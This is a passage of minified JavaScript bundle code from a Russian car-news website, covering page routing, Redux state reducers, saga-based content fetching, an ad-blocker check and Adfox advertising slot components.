          d = i(7405),
          g = i(3322),
          u = i(8557),
          m = i(5965),
          p = i(504),
          y = i(8479),
          I = i(1568),
          N = i(1168),
          j = i(7374),
          h = i(3165),
          x = i(3850),
          D = i(9748),
          f = i(559),
          w = i(8667),
          z = i(6178),
          T = i(2470),
          L = i(9026),
          E = i(236);
        function A(e) {
          var t = (0, l.TH)(),
            i = t.pathname,
            r = t.hash;
          return (0, E.lR)(function () {
            window.scrollTo(0, 0), "scrollRestoration" in window.history && (window.history.scrollRestoration = "manual");
          }, [i, r]), n.createElement(c.Or, e, n.createElement(s.J7, null), n.createElement(s._d, null), n.createElement(c.Ar, null, n.createElement(l.rs, null, n.createElement(l.AW, {
            exact: !0,
            path: "/",
            component: M.Z
          }), n.createElement(l.AW, {
            path: "/content/(articles|news|docs|blogs)/",
            component: d.Z
          }), n.createElement(l.AW, {
            path: "/(news|stories|tags|tests|events|special|allquiz|zr-plus|partners)",
            component: g.Z
          }), n.createElement(l.AW, {
            path: "/media*",
            component: g.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/collections/",
            component: m.Z
          }), n.createElement(l.AW, {
            path: "/collections/([a-z0-9]+)",
            component: u.Z
          }), n.createElement(l.AW, {
            path: "/(grandprix|newlife|trucks|ecology|quality-time)",
            component: p.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/docs/",
            component: I.Z
          }), n.createElement(l.AW, {
            path: "/docs/-/*",
            component: N.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/park-zr/",
            component: j.Z
          }), n.createElement(l.AW, {
            path: "/park-zr/*",
            component: h.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/polls/*",
            component: x.Z
          }), n.createElement(l.AW, {
            path: "/search/",
            component: D.Z
          }), n.createElement(l.AW, {
            path: "/tags-list",
            component: f.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/cars/([a-z0-9].*)/-/([a-z0-9].*)/reviews/",
            component: T.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/cars/([a-z0-9].*)/-/([a-z0-9].*)/(news|tests|media)",
            component: z.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/cars/([a-z0-9].*)/(news|tests|media)",
            component: z.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/cars/([a-z0-9].*)/-/([a-z0-9].*)/",
            component: z.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/cars/([a-z0-9].*)/about/",
            component: L.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/cars/([a-z0-9].*)/",
            component: z.Z
          }), n.createElement(l.AW, {
            exact: !0,
            path: "/cars/",
            component: w.Z
          }), n.createElement(l.AW, {
            path: "*",
            component: y.Z
          }))));
        }
        var b = i(4890),
          v = i(319),
          O = i.n(v),
          k = i(9713),
          C = i.n(k),
          S = i(1757),
          Z = i(2876);
        function Q(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function P(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? Q(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : Q(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var U = {
            stories: [],
            nextPage: 0
          },
          Y = {
            ssr: {
              global: {
                nav: {
                  navigation: {
                    branches: []
                  }
                },
                newMenu: {
                  secondMenu: []
                },
                bottomMenu: {
                  textPagesWithRubrics: [],
                  textPagesWithoutRubrics: []
                },
                info: {
                  date: {
                    day: 0,
                    month: 0,
                    year: 0
                  },
                  name: "",
                  requestURI: "",
                  serverName: ""
                },
                carBrandsList: {
                  brands: []
                },
                wholeSite: {},
                wholeSiteAnnouncement: {},
                userInfo: {}
              },
              content: {
                currentTopic: {
                  stories: []
                },
                top: {
                  stories: []
                },
                topNow: {
                  stories: []
                },
                topWeek: {
                  stories: []
                },
                topAll: {
                  stories: []
                },
                newTestDrive: {
                  stories: []
                },
                newNewsContent: {
                  stories: []
                },
                video: {
                  stories: []
                },
                announcementOnMainHeader: {
                  stories: []
                },
                news: {
                  stories: []
                },
                topicOfTheDay: {
                  stories: []
                },
                poll: {
                  polls: []
                },
                currentRubric: {
                  rubric: {
                    href: ""
                  }
                },
                main: {
                  stories: [],
                  tag: {
                    href: ""
                  },
                  story: {
                    additionalContentXml: "",
                    href: "",
                    isLongRead: !1,
                    contentXml: "",
                    _type: "",
                    id: 0,
                    published: !0
                  },
                  collectionsGroup: []
                },
                adv: {},
                mainPageRotationAnnounce: {
                  isMyPublishers: []
                },
                "video-zr": {
                  stories: []
                }
              },
              isLoading: {},
              wasRequested: {},
              wasReceived: {}
            },
            gallery: {},
            pollResult: {},
            advert: {
              isAdblockEnabled: !1,
              isScrolledFirstTime: !1
            },
            auth: {}
          };
        function _(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function W(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? _(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : _(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        function G(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function R(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? G(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : G(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var H = {
          isLoading: !1,
          isError: !1,
          errorCode: ""
        };
        function B(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function F(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? B(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : B(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var J = {
            isScrolledFirstTime: !1
          },
          V = i(8618),
          $ = i.n(V);
        function q(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function X(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? q(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : q(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var K = {
          stories: [],
          isLoading: !1,
          wasRequested: !1
        };
        function ee(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function te(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? ee(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : ee(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        var ie = {};
        function ne(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function re(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? ne(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : ne(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        function ae(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function oe(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? ae(Object(i), !0).forEach(function (t) {
              C()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : ae(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        const le = (0, b.UY)({
          ssr: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Y,
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z.au):
                var i = t.payload.url;
                return W(W({}, e), {}, {
                  isLoading: C()({}, i, !0),
                  wasRequested: C()({}, i, !0),
                  wasReceived: C()({}, i, !1)
                });
              case (0, S.getType)(Z.aQ):
                var n = t.payload,
                  r = n.ssr,
                  a = n.path,
                  o = r.global,
                  l = r.content;
                return W(W({}, e), {}, {
                  global: o,
                  content: l,
                  isLoading: C()({}, a, !1),
                  wasRequested: C()({}, a, !0),
                  wasReceived: C()({}, a, !0)
                });
              case (0, S.getType)(Z.Jb):
                var c = t.payload.path;
                return W(W({}, e), {}, {
                  wasRequested: C()({}, c, !0),
                  wasReceived: C()({}, c, !1),
                  isLoading: !1
                });
              default:
                return e;
            }
          },
          pollResult: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : H,
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z._1):
                var i,
                  n = t.payload.content,
                  r = n.poll_vote,
                  a = r.poll,
                  o = a.id;
                return R(R({}, e), {}, (i = {}, C()(i, o, a), C()(i, "isLoading", !1), i));
              case (0, S.getType)(Z.hn):
                var l = t.payload.content,
                  c = l.poll_vote,
                  s = c.error,
                  M = s.code;
                return R(R({}, e), {}, {
                  isError: !0,
                  errorCode: M,
                  isLoading: !1
                });
              default:
                return e;
            }
          },
          advert: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : J,
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z.lU):
                return F(F({}, e), {}, {
                  isAdblockEnabled: t.payload
                });
              case (0, S.getType)(Z.J):
                return F(F({}, e), {}, {
                  isScrolledFirstTime: t.payload
                });
              default:
                return e;
            }
          },
          storyFeed: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : K,
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z.NZ):
                return X(X({}, e), {}, {
                  isLoading: !0,
                  wasRequested: !0
                });
              case (0, S.getType)(Z.RZ):
                var i = t.payload.id,
                  n = e.stories.map(function (e) {
                    return e.id === i ? X(X(X({}, e), t.payload), {}, {
                      wasUpdated: !0
                    }) : e;
                  });
                return X(X({}, e), {}, {
                  stories: O()(n),
                  isLoading: !1
                });
              case (0, S.getType)(Z.Ek):
                var r = t.payload;
                return X(X({}, e), {}, {
                  stories: $()(O()(r), "id"),
                  isLoading: !1
                });
              default:
                return e;
            }
          },
          feed: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : U,
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z.FC):
                return P(P({}, e), {}, {
                  isLoading: !0
                });
              case (0, S.getType)(Z.T):
                var i,
                  n = t.payload.content,
                  r = e.stories ? [].concat(O()(e.stories), O()(n.main.stories)) : n.main.stories,
                  a = null === (i = n.main.paging) || void 0 === i ? void 0 : i.pageNum;
                return P(P({}, e), {}, {
                  stories: r,
                  isLoading: !1,
                  nextPage: a
                });
              default:
                return e;
            }
          },
          section: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ie,
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z.UF):
                return te(te({}, e), {}, {
                  isLoading: !0,
                  wasRequested: !0
                });
              case (0, S.getType)(Z.Av):
                var i = t.payload.content,
                  n = i.main.paging.pageNum,
                  r = n + 1;
                return te(te({}, e), {}, C()({}, n, {
                  stories: i.main.stories,
                  isLoading: !1,
                  nextHref: r,
                  wasRequested: !0
                }));
              default:
                return e;
            }
          },
          auth: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z.WM):
                return re(re({}, e), {}, {
                  isAuthModalOpen: t.payload
                });
              case (0, S.getType)(Z.K_):
                return re(re({}, e), {}, {
                  isAuthProcessing: t.payload
                });
              case (0, S.getType)(Z.$l):
                return re(re({}, e), {}, {
                  isAuthProcessing: !1,
                  user: t.payload
                });
              default:
                return e;
            }
          },
          gallery: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
              t = arguments.length > 1 ? arguments[1] : void 0;
            switch (t.type) {
              case (0, S.getType)(Z.r0):
                return oe(oe({}, e), {}, {
                  isGalleryFullscreen: t.payload
                });
              default:
                return e;
            }
          }
        });
        var ce = i(7757),
          se = i.n(ce),
          Me = i(4857),
          de = i(7137),
          ge = se().mark(me),
          ue = se().mark(pe);
        function me(e) {
          var t, i, n, r, a;
          return se().wrap(function (o) {
            for (;;) switch (o.prev = o.next) {
              case 0:
                return t = e.payload.url, i = {
                  Accept: "application/json"
                }, o.prev = 2, n = (0, de.m1)({
                  path: t,
                  cachedData: !0
                }), o.next = 6, (0, Me.RE)(fetch, n, {
                  headers: i
                });
              case 6:
                return r = o.sent, o.next = 9, (0, Me.RE)(function () {
                  return r.json();
                });
              case 9:
                return a = o.sent, o.next = 12, (0, Me.gz)((0, Z.aQ)({
                  ssr: a,
                  path: t
                }));
              case 12:
                o.next = 18;
                break;
              case 14:
                return o.prev = 14, o.t0 = o.catch(2), o.next = 18, (0, Me.gz)((0, Z.Jb)({
                  path: t
                }));
              case 18:
              case "end":
                return o.stop();
            }
          }, ge, null, [[2, 14]]);
        }
        function pe() {
          return se().wrap(function (e) {
            for (;;) switch (e.prev = e.next) {
              case 0:
                return e.next = 2, (0, Me.ib)((0, S.getType)(Z.au), me);
              case 2:
              case "end":
                return e.stop();
            }
          }, ue);
        }
        var ye = se().mark(Ne),
          Ie = se().mark(je);
        function Ne(e) {
          var t, i, n, r;
          return se().wrap(function (a) {
            for (;;) switch (a.prev = a.next) {
              case 0:
                return t = e.payload.nextPage, a.prev = 1, i = "https://www.zr.ru/IMP-main-more?p=".concat(t + 1), a.next = 5, (0, Me.RE)(fetch, i);
              case 5:
                return n = a.sent, a.next = 8, (0, Me.RE)(function () {
                  return n.json();
                });
              case 8:
                return r = a.sent, a.next = 11, (0, Me.gz)((0, Z.T)({
                  nextPage: t,
                  content: r.content
                }));
              case 11:
                a.next = 16;
                break;
              case 13:
                a.prev = 13, a.t0 = a.catch(1), console.log(a.t0);
              case 16:
              case "end":
                return a.stop();
            }
          }, ye, null, [[1, 13]]);
        }
        function je() {
          return se().wrap(function (e) {
            for (;;) switch (e.prev = e.next) {
              case 0:
                return e.next = 2, (0, Me.ib)((0, S.getType)(Z.FC), Ne);
              case 2:
              case "end":
                return e.stop();
            }
          }, Ie);
        }
        var he = se().mark(De),
          xe = se().mark(fe);
        function De(e) {
          var t, i, n, r;
          return se().wrap(function (a) {
            for (;;) switch (a.prev = a.next) {
              case 0:
                return t = e.payload.url, i = {
                  Accept: "application/json",
                  "X-Requested-With": "XMLHttpRequest"
                }, a.prev = 2, a.next = 5, (0, Me.RE)(fetch, t, {
                  headers: i
                });
              case 5:
                return n = a.sent, a.next = 8, (0, Me.RE)(function () {
                  return n.json();
                });
              case 8:
                if (r = a.sent, !Array.isArray(r)) {
                  a.next = 14;
                  break;
                }
                return a.next = 12, (0, Me.gz)((0, Z.Ek)(r));
              case 12:
                a.next = 16;
                break;
              case 14:
                return a.next = 16, (0, Me.gz)((0, Z.RZ)(r));
              case 16:
                a.next = 21;
                break;
              case 18:
                a.prev = 18, a.t0 = a.catch(2), console.log(a.t0);
              case 21:
              case "end":
                return a.stop();
            }
          }, he, null, [[2, 18]]);
        }
        function fe() {
          return se().wrap(function (e) {
            for (;;) switch (e.prev = e.next) {
              case 0:
                return e.next = 2, (0, Me.ib)((0, S.getType)(Z.NZ), De);
              case 2:
              case "end":
                return e.stop();
            }
          }, xe);
        }
        var we = se().mark(Te),
          ze = se().mark(Le);
        function Te(e) {
          var t, i, n, r, a, o, l;
          return se().wrap(function (c) {
            for (;;) switch (c.prev = c.next) {
              case 0:
                return t = e.payload, i = t.path, n = t.nextHref, r = {
                  Accept: "application/json",
                  "X-Requested-With": "XMLHttpRequest"
                }, c.prev = 2, a = "".concat("https://www.zr.ru/cache").concat(i, "?p=").concat(n), c.next = 6, (0, Me.RE)(function () {
                  return fetch(a, {
                    headers: r
                  });
                });
              case 6:
                return o = c.sent, c.next = 9, (0, Me.RE)(function () {
                  return o.json();
                });
              case 9:
                return l = c.sent, c.next = 12, (0, Me.gz)((0, Z.Av)({
                  nextHref: n,
                  content: l.content
                }));
              case 12:
                c.next = 17;
                break;
              case 14:
                c.prev = 14, c.t0 = c.catch(2), console.log(c.t0);
              case 17:
              case "end":
                return c.stop();
            }
          }, we, null, [[2, 14]]);
        }
        function Le() {
          return se().wrap(function (e) {
            for (;;) switch (e.prev = e.next) {
              case 0:
                return e.next = 2, (0, Me.ib)((0, S.getType)(Z.UF), Te);
              case 2:
              case "end":
                return e.stop();
            }
          }, ze);
        }
        var Ee = se().mark(Ae);
        function Ae() {
          return se().wrap(function (e) {
            for (;;) switch (e.prev = e.next) {
              case 0:
                return e.next = 2, (0, Me.$6)([(0, Me.rM)(pe), (0, Me.rM)(je), (0, Me.rM)(fe), (0, Me.rM)(Le)]);
              case 2:
              case "end":
                return e.stop();
            }
          }, Ee);
        }
        var be = i(797),
          ve = se().mark(Oe);
        function Oe() {
          return se().wrap(function (e) {
            for (;;) switch (e.prev = e.next) {
              case 0:
                return e.next = 2, (0, Me.Ys)();
              case 2:
              case "end":
                return e.stop();
            }
          }, ve);
        }
        var ke = window.__PRELOADED_STATE__;
        delete window.__PRELOADED_STATE__;
        var Ce = function (e) {
            var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Oe,
              i = arguments.length > 2 ? arguments[2] : void 0,
              n = "undefined" != typeof window && window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || b.qC,
              r = (0, be.ZP)(),
              a = [r],
              o = b.md.apply(void 0, a),
              l = i ? (0, b.MT)(e, i, n(o)) : (0, b.MT)(e, n(o)),
              c = r.run(t).toPromise();
            return {
              store: l,
              endPromise: c
            };
          }(le, Ae, ke).store,
          Se = new Promise(function (e) {
            return (0, a.TA)(e);
          });
        Promise.all([Se, de.ni]).then(function () {
          (0, r.hydrate)(n.createElement(o.VK, null, n.createElement(A, {
            store: Ce
          })), document.getElementById("root"));
        });
      },
      6804: (e, t, i) => {
        i.d(t, {
          J7: () => o,
          Wr: () => k,
          DB: () => Q,
          _d: () => G
        });
        var n = i(7294),
          r = i(4751),
          a = i(2876);
        function o() {
          var e = (0, r.I0)(),
            t = function () {
              e((0, a.lU)(!0));
            },
            i = function () {
              e((0, a.lU)(!1));
            };
          return (0, n.useEffect)(function () {
            fetch("https://yandex.ru/ads/system/context.js", {
              method: "HEAD",
              mode: "no-cors"
            }).then(i).catch(t);
          }, []), null;
        }
        var l = i(7154),
          c = i.n(l),
          s = i(3038),
          M = i.n(s),
          d = i(6479),
          g = i.n(d),
          u = i(3989),
          m = i(4343),
          p = i(2873),
          y = i(9713),
          I = i.n(y),
          N = i(7137);
        function j(e, t) {
          var i = (0, u.Fs)().isMobile,
            n = function (e) {
              var t = Array.isArray(e) ? e : [e, e],
                i = M()(t, 2);
              return {
                desktop: i[0],
                mobile: i[1]
              };
            }(e),
            r = n.desktop,
            a = n.mobile;
          return r === a ? r : void 0 === i ? t : i ? a : r;
        }
        var h = (0, n.createContext)({
          keys_array_space: [],
          puid1: [],
          puid2: [],
          puid3: [],
          puid4: [],
          puid5: [],
          puid6: [],
          puid7: [],
          puid8: [],
          puid9: [],
          puid10: []
        });
        function x(e, t) {
          var i = Object.keys(e);
          if (Object.getOwnPropertySymbols) {
            var n = Object.getOwnPropertySymbols(e);
            t && (n = n.filter(function (t) {
              return Object.getOwnPropertyDescriptor(e, t).enumerable;
            })), i.push.apply(i, n);
          }
          return i;
        }
        function D(e) {
          for (var t = 1; t < arguments.length; t++) {
            var i = null != arguments[t] ? arguments[t] : {};
            t % 2 ? x(Object(i), !0).forEach(function (t) {
              I()(e, t, i[t]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(i)) : x(Object(i)).forEach(function (t) {
              Object.defineProperty(e, t, Object.getOwnPropertyDescriptor(i, t));
            });
          }
          return e;
        }
        function f(e) {
          var t = e.p2,
            i = e.pp,
            r = e.ps,
            a = e.pke,
            o = e.ownerId,
            l = e.onError,
            c = void 0 === l ? function () {
              return null;
            } : l,
            s = e.adUnits,
            M = void 0 === s ? [null, null] : s,
            d = e.slot,
            g = e.mark,
            u = e.withReload,
            m = j(t),
            p = j(r),
            y = j(i),
            I = j(a),
            x = j(M),
            f = (0, n.useRef)(null),
            z = (0, N.YS)("adfox"),
            T = (0, n.useContext)(h),
            L = T.keys_array_space,
            E = T.puid1,
            A = T.puid2,
            b = T.puid3,
            v = T.puid4,
            O = T.puid5,
            k = T.puid6,
            C = T.puid7,
            S = T.puid8,
            Z = T.puid9,
            Q = T.puid10,
            P = {
              pk: L && L[0] || "",
              puid1: E && E[0] || "",
              puid2: A && A[0] || "",
              puid3: b && b[0] || "",
              puid4: v && v[0] || "",
              puid5: O && O[0] || "",
              puid6: k && k[0] || "",
              puid7: C && C[0] || "",
              puid8: S && S[0] || "",
              puid9: Z && Z[0] || "",
              puid10: Q && Q[0] || ""
            };
          return (0, n.useEffect)(function () {
            if (y && p && m) {
              var e = f.current,
                t = window.BRANDING_RELOAD || 3e4;
              if (e) {
                var i, n;
                e.id = z;
                try {
                  window.Ya.adfoxCode.hbCallbacks.push(function () {
                    x && window.Ya.headerBidding.pushAdUnits([w(x, z)]), window.yaContextCb.push(function () {
                      i = window.Ya.adfoxCode.create({
                        ownerId: o,
                        containerId: z,
                        params: D({
                          pp: y,
                          p2: m,
                          ps: p,
                          pke: I
                        }, P),
                        onError: function () {
                          c();
                        }
                      });
                    });
                  });
                } catch (e) {
                  console.log("ошибка ".concat(e, " в слоте ").concat(d)), console.log("ошибка ".concat(e, " в слоте ").concat(d));
                }
                return u && (n = setInterval(function () {
                  window.Ya.adfoxCode.reload("".concat(z));
                }, t)), function () {
                  i && i.destroy(), n && clearInterval(n);
                };
              }
            }
          }, [p, m, y]), n.createElement("div", {
            ref: f,
            "data-mark": g
          });
        }
        function w(e, t) {
          return e && D({
            code: t
          }, e);
        }
        var z = i(8865),
          T = i(9163),
          L = i(8655),
          E = T.ZP.div.withConfig({
            displayName: "styled__Wrapper",
            componentId: "sc-qn9gnl-0"
          })(["position:relative;box-sizing:border-box;background:#eaeaea;display:none;z-index:", ";", " ", " ", " ", " ", ""], function (e) {
            return e.$zIndex ? e.$zIndex : "auto";
          }, (0, L.fq)("$sticky", (0, T.iv)(["position:sticky;top:", "px;@media (max-width:1024px){position:sticky;top:0;}"], m.Pu)), (0, L.fq)("$noSticky", (0, T.iv)(["@media (max-width:1024px){position:relative;top:0;}"])), (0, L.fq)("$transparent", (0, T.iv)(["background:transparent;"])), (0, L.fq)("data-show-on-desktop", (0, T.iv)(["display:block;@media (max-width:768px){display:none;}"])), (0, L.fq)("data-show-on-mobile", (0, T.iv)(["@media (max-width:768px){display:block;}"]))),
          A = T.ZP.div.withConfig({
            displayName: "styled__BannerWrapper",
            componentId: "sc-qn9gnl-1"
          })(['display:block;width:100%;position:relative;&::before{content:"реклама";display:block;color:#828282;position:absolute;z-index:0;text-transform:uppercase;transform:translate(-50%,-50%);top:50%;left:50%;}height:', ";overflow:hidden;& > *:first-child{height:100%;}& > div{display:flex;width:100%;justify-content:center;align-items:center;& > div{width:100%;}}& > *{width:100%;height:100%;display:block;}", " @media (max-width:768px){height:", ";& > *:first-child{height:", ";}& > *{height:", ";}& > div{display:flex;width:100%;justify-content:center;align-items:center;text-align:center;height:", ";& > div{width:100%;height:", ";display:flex;align-items:center;justify-content:center;}}}"], function (e) {
            return e["data-desktop-height"];
          }, (0, L.fq)("$isCenterContent", (0, T.iv)(["display:flex;align-items:center;justify-content:center;text-align:center;"])), function (e) {
            return e["data-mobile-height"] ? e["data-mobile-height"] : "350px";
          }, function (e) {
            return e["data-mobile-height"] ? e["data-mobile-height"] : "350px";
          }, function (e) {
            return e["data-mobile-height"] ? e["data-mobile-height"] : "350px";
          }, function (e) {
            return e["data-mobile-height"] ? e["data-mobile-height"] : "350px";
          }, function (e) {
            return e["data-mobile-height"] ? e["data-mobile-height"] : "350px";
          }),
          b = ["height", "children", "isSticky", "showOnDesktop", "showOnMobile", "noSuspense", "preventUnload", "offset", "className", "transparent", "isCenterContent", "withMinHeight", "zIndex", "mark", "withoutSticky"];
        function v(e) {
          var t = e.height,
            i = void 0 === t ? [250, 350] : t,
            a = e.children,
            o = e.isSticky,
            l = e.showOnDesktop,
            s = void 0 === l || l,
            d = e.showOnMobile,
            u = void 0 === d || d,
            m = e.noSuspense,
            y = void 0 !== m && m,
            I = (e.preventUnload, e.offset),
            N = void 0 === I ? 500 : I,
            j = (e.className, e.transparent),
            h = e.isCenterContent,
            x = e.withMinHeight,
            D = e.zIndex,
            f = e.mark,
            w = e.withoutSticky,
            T = g()(e, b),
            L = (0, n.useState)(!1),
            v = M()(L, 2),
            O = v[0],
            k = v[1],
            C = (0, n.useState)(o),
            S = M()(C, 2),
            Z = S[0],
            Q = S[1],
            P = M()(i, 2),
            U = P[0],
            Y = P[1],
            _ = (0, r.v9)(p.xK);
          function W() {
            var e = document.getElementById("main-header");
            if (!e) throw new Error("Не найден элемент header");
            0 === (null == e ? void 0 : e.getBoundingClientRect().top) && k(!0);
          }
          return (0, n.useEffect)(function () {
            return _ ? function () {} : (window.addEventListener("scroll", W), function () {
              return window.removeEventListener("scroll", W);
            });
          }, [_]), (0, n.useEffect)(function () {
            _ && Q(!1), O && setTimeout(function () {
              Q(!1);
            }, 1e3);
          }, [O, _]), n.createElement(E, c()({
            "data-show-on-desktop": s,
            "data-show-on-mobile": u,
            "data-mark": f,
            $transparent: j,
            $sticky: Z,
            $zIndex: D,
            $noSticky: w
          }, T), n.createElement(A, {
            as: y ? "div" : z.Z,
            "data-desktop-height": "".concat(U, "px"),
            $isCenterContent: h,
            "data-mobile-height": "".concat(Y, "px"),
            offset: N,
            withMinHeight: x,
            contentVisibilityOn: !1
          }, a));
        }
        var O = ["slot", "isVisible", "className", "children", "offset", "withoutSticky"];
        function k(e) {
          var t = e.slot,
            i = e.isVisible,
            a = void 0 === i ? [!0, !0] : i,
            o = e.className,
            l = e.children,
            s = e.offset,
            d = void 0 === s ? 500 : s,
            y = e.withoutSticky,
            I = g()(e, O),
            N = (0, u.Fs)().isMobile,
            j = (0, r.v9)(p.xK),
            h = m.Jr[t],
            x = h || {},
            D = x.noSuspense,
            w = x.withoutWrap,
            T = x.height,
            L = x.preventUnload,
            E = x.transparent,
            A = x.isCenterContent,
            b = x.isSticky,
            k = x.withMinHeight,
            C = x.zIndex,
            S = x.mark;
          if (!h) return null;
          var Z = {
              config: h,
              slot: t,
              onAdvertError: function () {
                console.log("Ошибка в слоте: ", t);
              },
              hasAdblock: j,
              mark: S || ""
            },
            Q = M()(a, 2),
            P = Q[0],
            U = Q[1],
            Y = !N && P || N && U ? function (e) {
              var t = e.config,
